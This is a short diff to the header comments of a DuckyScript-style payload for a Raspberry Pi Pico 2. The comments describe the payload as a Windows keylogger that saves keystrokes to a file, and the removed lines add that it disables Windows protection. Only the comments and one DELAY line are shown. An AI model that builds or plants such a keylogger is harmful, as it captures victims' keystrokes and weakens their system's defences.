@@ -1,7 +1,6 @@
-REM Windows Keylogger using Raspberry Pi Pico 2 (no external storage)
-REM Disables Windows protection
-REM Logs save to keylogs.txt on Pico's internal CIRCUITPY drive.
-REM To stop: Eject Pico or delete keylogs.txt via setup mode.
+REM Windows Keylogger using Raspberry Pi Pico 2
+REM Logs save to keylogs.txt.
+REM To stop: Eject Pico and delete keylogs.txt.
 
 DELAY 4000
 
